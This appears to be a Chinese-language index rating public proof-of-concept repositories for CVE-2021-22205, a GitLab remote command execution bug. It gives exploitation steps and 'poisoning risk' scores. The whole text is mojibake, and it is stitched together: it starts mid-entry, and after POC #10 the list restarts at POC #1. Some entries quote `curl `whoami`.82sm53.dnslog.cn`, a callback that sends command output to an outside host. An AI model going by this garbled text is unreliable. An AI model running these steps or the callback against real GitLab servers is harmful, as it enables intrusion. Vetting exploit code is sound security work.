3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
